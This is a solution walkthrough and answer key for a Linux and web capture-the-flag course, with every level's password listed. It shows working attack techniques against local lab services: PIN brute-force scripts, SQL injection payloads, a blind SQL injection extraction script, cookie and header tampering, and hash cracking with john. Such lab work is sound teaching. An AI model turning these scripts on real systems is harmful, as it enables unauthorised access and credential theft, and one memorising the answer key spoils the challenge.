# Beeblebrox CTF Solution Guide

This Solution - Guide shows you how to solve level x.

## Level 0

Special characters need to be escaped. Often "-" means stdin.

```bash
cat ./-
```

**Password:** VeDfwE6aEbxAHXANbr79RBySgojiAJAS

## Level 1

Find is a powerful tool and has a lot of options to specify the search. Some of them are shown here:

```bash
find / -user ctf1 -size 21529138c | grep passwords.txt
#or
find passwords.txt / -user ctf1 -size 21529138c | grep passwords.txt
#and
cat /usr/share/dict/passwords.txt | grep ctf2
```

**Password:** aZG7eBfPp3LM4SfBU7Mor2UiDhYoyJYg

## Level 2

The cat commands even reads binary files some editors don't. To find out what file type you are dealing with use file. Then you can decide what to use next. A good way is to try some encoding formats like hex, base64 or rot13.

```bash
file pw.bin
cat pw.bin | base64 -d
```

**Password:** hUcitUm59Gdwu6y6fHLXEURR9AQ6jHsf

## Level 3

The program only uses a 4 digit pin to protect the password. So it is easy to crack it for modern computers. But it's a tedious task. So just write a small script to solve this. Keep track of the output. By the way: Its also able to reverse-engineer the program or use gdb.

```bash
#!/bin/bash
s1="Sorry you typed the worng pin."

for i in {0000..9999}
do
    echo $i;
    OUTPUT="$(./PW-Safe "-s" "ctf4" $i)"
    echo "${OUTPUT}"
    if [ "$OUTPUT" != "$s1" ]
    then
        echo "Found it"
        break
    fi
done
```

**PIN:** 4242

**Password:** PkqzfT6SRYzNCLj77qvzAoncJM9CDzpb

## Level 4

Git is a common version control (VC) system that's widely used. Developers can work together on the same code and then merge their changes together. It prevents code loss and accidental deletion. It also tracks who did what and when sombody changed somthing. But not everything should be available on public git repository. Compiled code and personal and system specific preferences should be ignored. Just like credentials like logins. When they end IP in git its not enough to just delete them.

So keep track what you push and what's in your .gitignore. It's a common flow to push sensitive data by mistake.

```bash
tar -xzf Game.tar.gz
cd SpaceShooter
git branch
git checkout ServerConnection
git log
git show 7dde2446b43bfbad43efd06009528bd3811b3b70 or
git show 7df671a13d760baae17faa6200f96749872021fe

```

**Password:** mLAih7m22xUmQw8gHcnKoDMPExyUjoL4

## Level 5

An easy way to offer a ssh server and prevent some users to log in via ssh is to just instantly log them off again. This is not a good idea.

Once someone is on another system even for milliseconds he can do damage. While logging in someone already can send commands:

```bash
ssh -t ctf5@localhost "ls -la"
ssh -t ctf5@localhost "cat ReadMe" | base64 -d
```

The encoding just prevents find or search tools to immediately find keywords like "password" but don't offer effective security.

**Password:** 2tQBHR9FW2uMbWvxSSokvGxGvehsSEFM

## Level 6

Just explore the features of your browser.

Login to the level.  
Did you ever heard from DevTools? Thats it. Just press F12 and read the HTML

**Password:** f6pJCsjoPLjd7vSFZFaHqxe9cJ3iJvX5

## Level 7

This is a bad example of how not to handle WebSessions with authentification.

Login to the level.  
Press F12. Go to Webstorage.  
Change the Value of the cookie logedin from 0 to 1

**Password:** Js9VryWFHbVRkti9RRzHaJT9Ht2hHAi3

## Level 8

Every http header is easy to modify and can be faked. There are a lot of tools out there for this. These tools are used to test and attack websites.

Postman:

* Open postman
* Send a request to http://localhost:8000/ctf/ctf8 (or IP/ctf/ctf8)
* Should see a response with not authorized.
* Open bowser and log in with ctf8 and the password
* Open DevTools and copy the Cookie Auth to Postman
* Resend reqest
* Now fake user-agent by filling adding this field to the header:
* User-Agent: Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5
* Resent reqest

FireFox:

* Install the addon User-Agent Switcher and Manager
* Go to the level site and log in
* Use the addon to pretent to be an IPhone
* You might have to disable javascript in the about:config

**Password:** SCZ4Ujm6fdoEnW4FejSt3v2kTcLh72VE

## Level 09

To protect sensitive information just with an pin is not a good idea. With some simple script you can crack thin pin in seconds

```Python
#!/usr/bin/env python3
import time
import requests
import string


cookies = {'Auth': 'KEY'}

for i in range(0000,9999):
    Data = {'text' : i}
    r = requests.post('http://localhost:8000/ctf/ctf9', data=Data,
        cookies=cookies)
    if('WRONG' in r.text):
        continue
    else:
        print(r.text)
        print(i)
        break


```

**Password:** D2g8okMqFaGJbt7aG6MEPM9LoLbKfemr

## Level 10

Text boxes where the user can enter somthing is always dangerous. They can type everything. If they type a command and the user input is not serialized than the service will run the command. In this case a SQL command.

```SQL
;SELECT * FROM Data
--F3 search for ctf
--or
;SELECT * FROM Data WHERE user LIKE "ctf%"
```

**Password:** BaFm2uW3PHdcUyB8Tc2MUc2efWxFU4S4

## Level 11

Similar to last level. But this time the DB-Query result is not directly showed on the page. We get a binary answer: YES the user exists or NO the user does not exists (or invalid query).

But again we can manipulate the query and from the source code we know how the query and DB schema looks like. So we can gerarate a couple of questions that tells us if the password has an "a" in it or a "b" and so on ...

This python script generates the right passowrt just by asking quertions:

```Python
import time
import requests
import string


charset = ''.join(sorted(string.digits + string.ascii_letters))
neededchars = ''
password = ''

cookies = {'Auth': 'KEY'}

for c in charset:
    Data = {'text' : 'ctf12" and pw LIKE BINARY "%' + c + '%" #'}
    r = requests.post('http://localhost:8000/ctf/ctf11', data=Data,
        cookies=cookies)
    if('YAY' in r.text):
        neededchars = neededchars + c
        print(neededchars)
    # time.sleep(1)


print(neededchars)
for i in range(0,32):
    # time.sleep(1)
    for char in neededchars:
        Data = {'text' : 'ctf12" and pw LIKE BINARY "' + password + char + '%" #'}
        r = requests.post('http://localhost:8000/ctf/ctf11', data=Data,
            cookies=cookies)
        if 'YAY' in r.text :
            password = password + char
            print(password)
            break

print(password)

```

**Password:** me9VaFFEWatXuLk9xyYB6NzkUqEWwJhv

## Level 12

The executable *Server* starts a socket on the given port. Use a port that is not reserved for special services. (Like SSH uses 22, Websites 80 and DNS 5353).

Now the server is listening on that port and you can send a request. Webrequests will not work but on Linux there is the 'nc' aka 'ncat' command. Its called the "Swiss army knife of networking" because you can do almost everything with it. You can send commands, transfer files or listen on a port.

```Bash
./Server 6001
#In new terminal
ncat localhost 6001
Hi
#or
nc localhost 6001
Hi
```

**Password:** oUA2NA3FiFbnj47BRJmztuaffL8nDbAL

## Level 13

The tool "john" is one of the most powerful passwortcracking tools out there. Its used to crack passwordfiles wifi passowrds and alot more.

The first step is to extrackt the passowrd hash out of your encrypted file. There are alot of small helpers for that in john. Like *rar2john*, *keepass2john* and lots of others.

Next you will can break the hash with *john* a good wordlist is essential for improved processing time. In this example there are just some small wordlists.

```Bash
#Extract the hash in a file
./john/zip2john pw.zip > pw.zip.hash
#Break the hash
./john/john --wordlist=wordlists/passwords.txt pw.zip.hash
```

**Password:** d28YjxxCrhkmw4mTosy4P2hmCWUcPEaB

## Level 14

Steganography is the technieque to hide data in other files. Often normal pictures or music is used to hide the secred information. There are some tools out there to detect if a picture das hidden data in it. In this example its just one picture protected with a password.

The user also have to use the ssh-key to login to the next level. So there is no passowrd and it shows how powerful ssh-keys are.

```Bash
#Get th os name
hostname
#Get the file form the pic
steghide extract -sf hack_this.jpg
#Change permission
chmod 700 tatu-key-ecdsa
#Connect to the next level
ssh -i tatu-key-ecdsa ctf15@localhost
```

**Password:** 6E8Wmjx7DjkVixD4whK9NRNnUsfHY98p

## Level 15

Nmap is one of the most powerful networktool out there. It can detect open ports on a given IP and shows the running services. This shows on wich ports your system can be accsessed by the outer world. The tool is used by attacers and admins to find out what is running on the system.  
namp is often used in scripts with various IPs to scan large networks

```Bash
#Scan to network
nmap -p 1-65535 localhost
```

**Password:** 6E8Wmjx7DjkVixD4whK9NRNnUsfHY98p
